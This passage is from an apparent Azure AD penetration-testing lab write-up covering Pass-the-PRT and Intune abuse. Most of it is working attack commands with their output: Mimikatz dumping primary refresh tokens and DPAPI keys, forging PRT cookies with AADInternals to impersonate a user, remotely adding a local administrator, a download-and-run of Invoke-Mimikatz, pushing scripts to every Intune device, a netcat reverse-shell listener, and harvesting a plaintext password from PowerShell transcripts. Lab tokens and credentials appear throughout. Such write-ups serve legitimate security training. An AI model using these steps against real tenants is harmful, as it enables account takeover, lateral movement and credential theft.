AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACdP69FqJivR7qowLToUtYZAAAAAAIAAAAAABBmAAAAAQAAIAAAAP_uwfiedmDCjjbPUPlZobSOhzhyDHTUDlqzngV_7aXhAAAAAA6AAAAAAgAAIAAAADv0zO3GE_m3YYQPcggA7LybZp8LoOy_IoQ3bn_pMxleMAAAAPo9mTZwXnqfbyjlx6Zyl-bXmLRo1JK31w9_LhvbkuJst2OvxhhFc7-n8BVHffE_s0AAAABIpqvMdpszXMgRkKj903tg29-QWVCmi6aHi6KZphi_7faYEhXyPAxyLRdFB26e166WsAIpc2X4cux9_dYBc-Jx
```

- TenantId:

```
2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```

<br/>

Use the above information to get the **context key** and **derived key**:

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACdP69FqJivR7qowLToUtYZAAAAAAIAAAAAABBmAAAAAQAAIAAAAP_uwfiedmDCjjbPUPlZobSOhzhyDHTUDlqzngV_7aXhAAAAAA6AAAAAAgAAIAAAADv0zO3GE_m3YYQPcggA7LybZp8LoOy_IoQ3bn_pMxleMAAAAPo9mTZwXnqfbyjlx6Zyl-bXmLRo1JK31w9_LhvbkuJst2OvxhhFc7-n8BVHffE_s0AAAABIpqvMdpszXMgRkKj903tg29-QWVCmi6aHi6KZphi_7faYEhXyPAxyLRdFB26e166WsAIpc2X4cux9_dYBc-Jx /unprotect" "exit"'
```

![picture 171](images/b21f757347d4254bfe8cada7ece864d5f57aeaf11d56279556e69356279b1f62.png)  

- Context: `7d7dbc305a7197248e73f8b8f3a9c4c2daa73d764b045fea`
- Clear key: `ced4b534a175670c536047d3a078aba290afdb4ff756f2b82ddf3a7f013ddadd`
- Derived Key: `b9a764a4453a6fc7ceb2dfddbf65812b2f4d1c00e7933c7140a0dbfa226b2b66`

<br/>

Copy the modified version of **PrtToCert** from the local machine to `jumpvm`:

```
copy -ToSession $jumpvm -Path C:\AzAD\Tools\PrtToCert-master.zip -Destination C:\Users\vmuser\Documents\student190\ -Verbose
```

![picture 172](images/bd452cfc9d413ec76b7eb4e078c639e66612f578dd308cf3f07c2080f8fb4f5f.png)  

<br/>

Get back to the PSSession and extract the ZIP:

```
Enter-PSSession -Session $jumpvm
Expand-Archive -Path C:\Users\vmuser\Documents\student190\PrtToCert-master.zip -DestinationPath C:\Users\vmuser\Documents\student190\PrtToCert
dir C:\Users\vmuser\Documents\student190\PrtToCert
```

![picture 173](images/19711b89d6f43160afa6636ebede4d3b915d6f4aeb54adcb21afde0bf93bb6a7.png)  

<br/>

Request a certificate from Azure AD as the user `samcrgray`:
- `--prt` = PRT
- `--tenantId`
- `--userName`
- `--hexCtx` = Context key
- `--hexDerivedKey` = DerivedKey

```
& 'C:\Program Files\Python39\python.exe' C:\Users\vmuser\Documents\student190\PrtToCert\RequestCert.py --tenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 --prt MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBTEUuQWdBQkFBQUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQOTFtU1cxb285VjduZHUzUk5wc1lqOTdSck1HTE93S1k3TGRUR1gxUGR2UHR3YlpQR040V2RIVkl5bjlacXhkMnV3Q1ZPN0pGb0t1ZlY5WTVDUncxTDk2V1FvSzBoSDNhWWYxTnpxMnFpbUtESDJJaWdoZjVjT0NmSzlDRWxYTnMxYmltZEdLRHlGZVhyNUNTb3d1RTdFaGR1cjhRWkM1OWJyWXFDS1dJd2cyZjlqZ3B1SGR1Zy14QlVNSXpzX01VaElyTTUxUTlHNXdHUVFPWmxMb1ZIdlBfcVo3WkpqbGh1SkFYNFVMaThxcjgtUTQ3ZnN2V3lhb1NZRHlaMVVoSjdzUjg1aVI1OEs4RFZnQVpzRTFRemxyN1B6alE2TDYyaWo1M1kxVGQzM1FYMXVtcklRVWdWVzExNG9fU3loTmF3TWtQYW5xT2xKVjFXYXd1bG9LVVh3ZmNVTkcwUDkyV0tURUdHaEFaQVlob1o4eTc5N0F5SXAtX0pUVHUzdm42Ui05dS0wVk5CR01ETkNLWlltay15MGdzQmN4T1Z6Z29LZTJaeGRrSkktbjlqZW5hdkpUTC1kS2tFcHQ4NDdQS1g4aWpjMnJzNThyeUVacFFXb3pvUU9UMzF5Z2wtc0UxZ0hwSlhPQlV1ZzUtVnFiQ2ZTRnAyRjhHOGE0RmRLY2FUSlpLcVg3ZWUyLVFaQWc0a2FadFRUdHMzT2NKN0U0TlBNV00zcXdQUzE4SzhWZHc5V1YxQTZodlZUeVpEMkVmT0ZYLVpGLVo3cHdjVWJjbUhaaDA1MWlYbGQzald5UGhfR1JuRDEwZzhiNHZuVXliQ0xKQ1lOdWhfeFRlSmJVUzlzbDdkb0E2Rm9NSUxHbTVrVzduNzFkWVozQkU0VzY3Qjdtc1pITW9maEo0U0xLcGliSXR0VlBuaGJsVlNzcDNMQVViYlZXSVBfdTVtbGh4dDdqajlycXA1VDM4M3NaSGNpSmZBWXc2d1VqVjQ2YS03ZXBZTUtiUVVtLTNIU1ZsRy1uQjR6cFJ4VHZ1Ujh3ZHlVQ25zdnhzallOSUdBZXJyVDBOR3htWVg5Q1hHelZ0NXBpMGFzSC1TMWVmNW5QclA5UGpPNmtqLU9Bak9QNGN1ckVIY2xwWFBidWdYZ0pnRmhQekJKRnczUXBaX0RZS1JOaTZXMVNfQjlmVlVMR1JoU0dhQS1ZX05RUXFKTEloTzdWLXRrdlc0SzlkdEZBX202R0dLR2pNTXZ5V1JZSUc5VW9BT1BXUWt4SzZwa3FXTVFSODVXLVlLNDc0dnAwbkNIVF9yM18tZnBNdU93TU1GSmR5c0doUUJfU0hNWUNLdWJjLTdMUFh2cHdTd0xhQWNRV2hJT2J5cFRZQTBORkQ2b1lqNVZxU3JPSzNscXRR --userName samcgray@defcorphq.onmicrosoft.com --hexCtx 7d7dbc305a7197248e73f8b8f3a9c4c2daa73d764b045fea --hexDerivedKey b9a764a4453a6fc7ceb2dfddbf65812b2f4d1c00e7933c7140a0dbfa226b2b66
```

![picture 174](images/e62b556af96ea3cfc90cca898caa4d2e0bdf08af3c16d7c0e77ef37832af850a.png)  


<br/>

Also stage the slightly modified version of **AzureADJoinedMachinePTC** to `jumpvm`:

```
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\AzureADJoinedMachintPTC-master.zip -Destination C:\Users\vmuser\Documents\student190\ -Verbose
Enter-PSSession -Session $jumpvm
Expand-Archive -Path C:\Users\vmuser\Documents\student190\AzureADJoinedMachintPTC-master.zip -DestinationPath C:\Users\vmuser\Documents\student190\AzureADJoinedMachintPTC
```

![picture 175](images/3e3f7d5b97013ccddb84fdf7d1b9a105a4813950a4be4d3c1c43cbc598a0ed96.png)  

<br/>

Use the certificate generated for `samcgray` and execute the following command:
- `10.0.1.5` is `infradminsrv` enumerated

```
python C:\Users\vmuser\Documents\student190\AzureADJoinedMachintPTC\main.py --usercert C:\Users\vmuser\Documents\student190\samcgray@defcorphq.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.0.1.5 --command "cmd.exe /c net user student190 Stud190Password@123 /add /Y && net localgroup administrators student190 /add"
```

![picture 176](images/a3713847f6e0e11e1807a47606e7cdcd058f6d84cd7600558c9310814df5e3cb.png)  

<br/>

Check if `student190` is added to the VM `infradminsrv`:

```
$password = ConvertTo-SecureString 'Stud190Password@123' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('.\student190', $password); $infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $cred; Invoke-Command -Session $infradminsrv -ScriptBlock{hostname; whoami}
```

![picture 177](images/f26bf7073c6ff70200b84a69a11a556f02319e81fb434e591e271c9857ca8a81.png)  

- We can execute command on `infradminsrv` using the generated certificate

<br/>

---

## Objective 21: PRT & Intune

**Questions**

1. Extract PRT of a user from the infradminsrv VM and execute Pass-the-PRT attack.
2. Enumerate machines enrolled to Intune.
3. If the above user has Intune Administrator or Global Administrator role, execute PowerShell scripts on an on-prem enrolled machine to add an administrative user to that machine.
4. Using the credentials of the user you added, PSRemote to the machine and extract credentials from it.

<br/>

In high level, the PRT can be obtained using Mimikatz `sekurlsa::cloudap`.

Since we have added a local admin on `infradminsrv`, we can remotely run Mimikatz in the `jumpvm` session:

```
$password = ConvertTo-SecureString 'Stud190Password@123' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('.\student190', $password); $infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $cred; Invoke-Command -Session $infradminsrv -ScriptBlock{iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")}

Invoke-Command -Session $infradminsrv -ScriptBlock { Invoke-Mimikatz -Command ' "privilege::debug" "sekurlsa::cloudap" ' }
```

![picture 178](images/b7b15ea98a9df60a394b7663bb79798ad0e39620e12a25c1c6f98dfd7c9f64f2.png)  

- Identity: `michaelmbarron@defcorphq.onmicrosoft.com`
- PRT:

```
MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBQ2suQWdBQkFBQUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQLUlJMHp0SERfY1RCZ3N3SUF2VjA5Wl9kUmJLeGtkYWZuNzBtbERTVlVEZ3IyTEtjaXFwSGprZU5TWEZ3N0NZQXloYkhjX2h3amN5SmJUak9ETWV5UC04bmtObWFkS21lLWxCNjA0VmhaSXVCdUZYN0cwazdlaEduX0JMbUdseVpkZ0tReDQwTWtfMTF6WXVoclhucjhsbmYwUldQNWlXd2RfNEtzUFpIWHRpOGl4aFdyRmdmVFRuSldRU0NQem1GdzYtWVRQYnpHejViQkxfVlQwbjhmZUdxWWlxaVRlZ190RGUxVVY2Sy1OUXE1MkQ0WFc0bVZWc2dQN1lHMjk0R2dGT0dib1ctU0dsY3NsUXdaVWs5QkYxRTJSVDlzQ21OcjNHMkNaeTJWc3o4UjBOY0JuLWZmZ05qZ1dsekdPekhMT282WFJQWnRKQ0pTWkstaDkzajJKdzdZM2dpc2ROMm1IZUwxQ2RFel9OVmRnY0ZkSEg5dS1xTE1MMnB0bnk1aFNjNWNfcGlLUkNYV1FBNnlpSThVWEhheklRbHRaTVhwMzBWcFZNTmVXSTJER3ozVEFINUZtaVJZNWNfUTRDX2draHhtaHpMZ0NGemdpLVExc1I5Rm5WSWNMTF84YTRJRks2U2lMaWtCRTl3aUhLbHVlNXdKQ1hDRzJTTXNfUUlrVWhxQi1rYjlzaFRrSnJWLXBmRjFNdV9zR2RmQVBfVnVjaEt0Umh1eFd6eGl1WTd1c0dKYmMyLTRKenM5R2dWaGh2dktXTWdCVFd0dEdhZm5hYzBaUmdtQ0xtR1A2RzFtUThhT1phYy1UQW0xSjFpREFBMk1RSnh1eDVVbllpWUItdG90ZkM3U1RCQ0FQMXNNYlVHcGdDNk90YmtteWJBOEh4N0lkVmtOMXV3WjV5VTJKbXViRzRRbDZLZmZVTy1nTVZFVHlvcDd5R18tVndmNGNCRXhpaERsNDhkZ25fZ1dtZ2hHc2FNY25hZmxMZWRpNkF1RGE0YUMtNkdTQUswbFRtbkxJWFZ5SlJXdURBMU5VVFBwelRfWVVFR1FHWDd4Wm1SSDJpYmM0TFRoYWJadlYyZVBfUXpfdzZZNnNTcjRpTDZUb2VXMGdOcHNOdHpPNEU0VFVJQ3EwWWZ4V05OZEpUVjZ3WnR4YzlNYTg1VnY5T3F2U2s0aWQ5X1FTS0pCTTdGOXR5eVFhSkR0SThhbXJQQzlRNHcwUE9XaVk1cmh5UmFKdnlOUlc1d3pVbjZiQkRiMExFekZKS3Exa0ZhYU5XLU5lN2RtazRDVmo3VFFiS3VSeTY2YVlFWXJiSVpkb2dLWXBNdF9Wa1lYQ2Vib2NHaVc4LVc0cU1NM0h2S3M0eExBV0I1LUZzTzdGR3NVR09nb0tGQWdzNGdyQnVBNi1MNUNxX3o0ZDV4NXZVLVRf
```

- TenantId:  `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`
- KeyValue:

```
AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADlbdk73WdhRrs_YeNN641eAAAAAAIAAAAAABBmAAAAAQAAIAAAACMkyE5cKNt2Cklsf7wyLS3Z7pE1VstbHQKkHbWuQwFhAAAAAA6AAAAAAgAAIAAAAHOxd3bYUToPis1KiLg2hcZxHKOIXowhu2W_jBffDOpqMAAAAI7Ps71Yd_OUd0VmxN0TiF65O8CMtD8YxPvCLpQYczVsWmE0AKBgJ2cxfB1ztbEmCkAAAAAUkQrD1gx-u4g1i3A9qWBaXJQBDT5bDnuym8APreTUm5gAl4paqb5FIXd8Xbg6tFFMCdxT7W73iy435xbzidc0
```

<br/>

Then use the session key from the above to extract context, session key and derived key:

```
Invoke-Command -Session $infradminsrv -ScriptBlock { Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADlbdk73WdhRrs_YeNN641eAAAAAAIAAAAAABBmAAAAAQAAIAAAACMkyE5cKNt2Cklsf7wyLS3Z7pE1VstbHQKkHbWuQwFhAAAAAA6AAAAAAgAAIAAAAHOxd3bYUToPis1KiLg2hcZxHKOIXowhu2W_jBffDOpqMAAAAI7Ps71Yd_OUd0VmxN0TiF65O8CMtD8YxPvCLpQYczVsWmE0AKBgJ2cxfB1ztbEmCkAAAAAUkQrD1gx-u4g1i3A9qWBaXJQBDT5bDnuym8APreTUm5gAl4paqb5FIXd8Xbg6tFFMCdxT7W73iy435xbzidc0 /unprotect" "exit"'}
```

![picture 180](images/3cbf6153dd0ea8ff3bd37b65bfe695d119d4aa0f84b70d5830467b85ff8e3c0a.png)  

- Context: `9a6ee19d25eadca22ffd7b8c41f92e4b46ab0b875d04fb57`
- Clear Key (Session Key): `e574d991ddfd1f44d8c2ad8a0eb9f5144319544f30d85ce704f6a3d1e436ca5c`
- Derived Key: `d09f17b8f9564dd1507a1fb4c32db2a51d5435244c252147f143f27406c64092`

<br/>

Execute Pass-the-PRT attack from the student VM using AADInternal tool:

```
$PRTOfMBarron = 'MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBQ2suQWdBQkFBQUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQLUlJMHp0SERfY1RCZ3N3SUF2VjA5Wl9kUmJLeGtkYWZuNzBtbERTVlVEZ3IyTEtjaXFwSGprZU5TWEZ3N0NZQXloYkhjX2h3amN5SmJUak9ETWV5UC04bmtObWFkS21lLWxCNjA0VmhaSXVCdUZYN0cwazdlaEduX0JMbUdseVpkZ0tReDQwTWtfMTF6WXVoclhucjhsbmYwUldQNWlXd2RfNEtzUFpIWHRpOGl4aFdyRmdmVFRuSldRU0NQem1GdzYtWVRQYnpHejViQkxfVlQwbjhmZUdxWWlxaVRlZ190RGUxVVY2Sy1OUXE1MkQ0WFc0bVZWc2dQN1lHMjk0R2dGT0dib1ctU0dsY3NsUXdaVWs5QkYxRTJSVDlzQ21OcjNHMkNaeTJWc3o4UjBOY0JuLWZmZ05qZ1dsekdPekhMT282WFJQWnRKQ0pTWkstaDkzajJKdzdZM2dpc2ROMm1IZUwxQ2RFel9OVmRnY0ZkSEg5dS1xTE1MMnB0bnk1aFNjNWNfcGlLUkNYV1FBNnlpSThVWEhheklRbHRaTVhwMzBWcFZNTmVXSTJER3ozVEFINUZtaVJZNWNfUTRDX2draHhtaHpMZ0NGemdpLVExc1I5Rm5WSWNMTF84YTRJRks2U2lMaWtCRTl3aUhLbHVlNXdKQ1hDRzJTTXNfUUlrVWhxQi1rYjlzaFRrSnJWLXBmRjFNdV9zR2RmQVBfVnVjaEt0Umh1eFd6eGl1WTd1c0dKYmMyLTRKenM5R2dWaGh2dktXTWdCVFd0dEdhZm5hYzBaUmdtQ0xtR1A2RzFtUThhT1phYy1UQW0xSjFpREFBMk1RSnh1eDVVbllpWUItdG90ZkM3U1RCQ0FQMXNNYlVHcGdDNk90YmtteWJBOEh4N0lkVmtOMXV3WjV5VTJKbXViRzRRbDZLZmZVTy1nTVZFVHlvcDd5R18tVndmNGNCRXhpaERsNDhkZ25fZ1dtZ2hHc2FNY25hZmxMZWRpNkF1RGE0YUMtNkdTQUswbFRtbkxJWFZ5SlJXdURBMU5VVFBwelRfWVVFR1FHWDd4Wm1SSDJpYmM0TFRoYWJadlYyZVBfUXpfdzZZNnNTcjRpTDZUb2VXMGdOcHNOdHpPNEU0VFVJQ3EwWWZ4V05OZEpUVjZ3WnR4YzlNYTg1VnY5T3F2U2s0aWQ5X1FTS0pCTTdGOXR5eVFhSkR0SThhbXJQQzlRNHcwUE9XaVk1cmh5UmFKdnlOUlc1d3pVbjZiQkRiMExFekZKS3Exa0ZhYU5XLU5lN2RtazRDVmo3VFFiS3VSeTY2YVlFWXJiSVpkb2dLWXBNdF9Wa1lYQ2Vib2NHaVc4LVc0cU1NM0h2S3M0eExBV0I1LUZzTzdGR3NVR09nb0tGQWdzNGdyQnVBNi1MNUNxX3o0ZDV4NXZVLVRf'
while($PRTOfMBarron.Length % 4) {$PRTOfMBarron += "="}
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRTOfMBarron))
$ClearKey = "e574d991ddfd1f44d8c2ad8a0eb9f5144319544f30d85ce704f6a3d1e436ca5c"
$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $Skey -GetNonce
```

![picture 181](images/cb911d49ac72a4c354f332348231c6e7a1d23e18a46da81647aac7694d644535.png)  

- Nonce:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImN0eCI6Ik1nd2dCM3ZlQWxDaUNkWHl1Y0hxSWYxRDZhMXlYZytxIn0.eyJpc19wcmltYXJ5IjoidHJ1ZSIsImlhdCI6MTYyMDQ4OTc0OSwicmVxdWVzdF9ub25jZSI6IkF3QUJBQUFBQUFBQ0FPel9CQUQwXy1hWmsweHFuMUVDLVNkbE9WVFg0dU9jdU9KZC1ZWkNsLXNmS001cURtRkNKa1VfZS1UMnBNSFF5RFIyODVMREVITUJFbDBWektYV1g5bDBzejhCLUtvZ0FBIiwicmVmcmVzaF90b2tlbiI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dG9jN3FqaHRvQmRJc25WNk1XbUkyVHR3QUNrLkFnQUJBQUFBQUFELS1ETEEzVk83UXJkZGdKZzdXZXZyQWdEc193UUE5UC1JSTB6dEhEX2NUQmdzd0lBdlYwOVpfZFJiS3hrZGFmbjcwbWxEU1ZVRGdyMkxLY2lxcEhqa2VOU1hGdzdDWUF5aGJIY19od2pjeUpiVGpPRE1leVAtOG5rTm1hZEttZS1sQjYwNFZoWkl1QnVGWDdHMGs3ZWhHbl9CTG1HbHlaZGdLUXg0ME1rXzExell1aHJYbnI4bG5mMFJXUDVpV3dkXzRLc1BaSFh0aThpeGhXckZnZlRUbkpXUVNDUHptRnc2LVlUUGJ6R3o1YkJMX1ZUMG44ZmVHcVlpcWlUZWdfdERlMVVWNkstTlFxNTJENFhXNG1WVnNnUDdZRzI5NEdnRk9HYm9XLVNHbGNzbFF3WlVrOUJGMUUyUlQ5c0NtTnIzRzJDWnkyVnN6OFIwTmNCbi1mZmdOamdXbHpHT3pITE9vNlhSUFp0SkNKU1pLLWg5M2oySnc3WTNnaXNkTjJtSGVMMUNkRXpfTlZkZ2NGZEhIOXUtcUxNTDJwdG55NWhTYzVjX3BpS1JDWFdRQTZ5aUk4VVhIYXpJUWx0Wk1YcDMwVnBWTU5lV0kyREd6M1RBSDVGbWlSWTVjX1E0Q19na2h4bWh6TGdDRnpnaS1RMXNSOUZuVkljTExfOGE0SUZLNlNpTGlrQkU5d2lIS2x1ZTV3SkNYQ0cyU01zX1FJa1VocUIta2I5c2hUa0pyVi1wZkYxTXVfc0dkZkFQX1Z1Y2hLdFJodXhXenhpdVk3dXNHSmJjMi00SnpzOUdnVmhodnZLV01nQlRXdHRHYWZuYWMwWlJnbUNMbUdQNkcxbVE4YU9aYWMtVEFtMUoxaURBQTJNUUp4dXg1VW5ZaVlCLXRvdGZDN1NUQkNBUDFzTWJVR3BnQzZPdGJrbXliQThIeDdJZFZrTjF1d1o1eVUySm11Ykc0UWw2S2ZmVU8tZ01WRVR5b3A3eUdfLVZ3ZjRjQkV4aWhEbDQ4ZGduX2dXbWdoR3NhTWNuYWZsTGVkaTZBdURhNGFDLTZHU0FLMGxUbW5MSVhWeUpSV3VEQTFOVVRQcHpUX1lVRUdRR1g3eFptUkgyaWJjNExUaGFiWnZWMmVQX1F6X3c2WTZzU3I0aUw2VG9lVzBnTnBzTnR6TzRFNFRVSUNxMFlmeFdOTmRKVFY2d1p0eGM5TWE4NVZ2OU9xdlNrNGlkOV9RU0tKQk03Rjl0eXlRYUpEdEk4YW1yUEM5UTR3MFBPV2lZNXJoeVJhSnZ5TlJXNXd6VW42YkJEYjBMRXpGSktxMWtGYWFOVy1OZTdkbWs0Q1ZqN1RRYkt1Unk2NmFZRVlyYklaZG9nS1lwTXRfVmtZWENlYm9jR2lXOC1XNHFNTTNIdktzNHhMQVdCNS1Gc083RkdzVUdPZ29LRkFnczRnckJ1QTYtTDVDcV96NGQ1eDV2VS1UXyJ9.kKpbRT28rN5rXouoq2Jt6GUvZ9YnDQKbNbTt_rN4Qsg=
```

<br/>

Using the resulting PRT to browse https://login.microsoftonline.com/login.srf, under Incognito mode, use Developer Tool to clear all cookies and add `x-ms-RefreshTokenCredential` with the nonce above + HttpOnly and Secure flag:

![picture 182](images/7b98bdba12762864ed0887b1a73b06758b9d33a7c008f5ea6af3dd07766857da.png)  

<br/>

Browse https://login.microsoftonline.com/login.srf, we logged in as Michael M. Barron:

![picture 183](images/06e72b4f1a2e79f9a0c8f9e269b4adc3438b01c95ab9cd94432d4d6051e1164a.png)  

<br/>

Then go to https://portal.azure.com -> AAD, we can see the current role is **Intune administrator**:

![picture 184](images/df053d7bcbedcd245d9c740ea74491182e3b85c26a1e1e2412cceaab5b81865b.png)  

<br/>

Navigate to https://endpoint.microsoft.com/#home we can see all devices:

![picture 186](images/8f75e02497a9abefb81bbb490ee01918b5cf84159a3d6e8dfa00db5867a501bb.png)  


<br/>

Navigate to **Scripts > Add (Windows 10) > Add PowerShell Script > Add a new script called student190-script**.

Use the script `adduser.ps1` and enable `Run script in 64 bit PowerShell Host`:

![picture 188](images/eeca146eecf50fd45d65f83021643ea123921589878b4745136e6ae8b9f5a264.png)  


<br/>

For assignments, include all devices and users:

![picture 189](images/f1c811204f36263b7712b7c6abc04f34ddd0d898212654cfe98740568c05fbf1.png)  

<br/>

Also use a ReverseShell script as well (similar to above). Use a netcat listener and wait for callback:

```
cd C:\AzAD\Tools\netcat-win32-1.12\
.\nc64.exe -lvp 4444
```

![picture 190](images/763e6cfb157f6234f2f4c415f7f42e70d999ad85b0c40e90a2b54f7263713863.png)  

<br/>

Try to obtain credentials in PS history:

```
cat C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```

![picture 191](images/819cbc684e8cc6fb7ed2f8c3d17eb67cbf781f13fdbaf98da8b17e2359a0412f.png)  

- ComputerName: `defres-adcnct`
- Credential: `adconnectadmin` / `UserIntendedToManageSyncWithCl0ud!`

<br/>

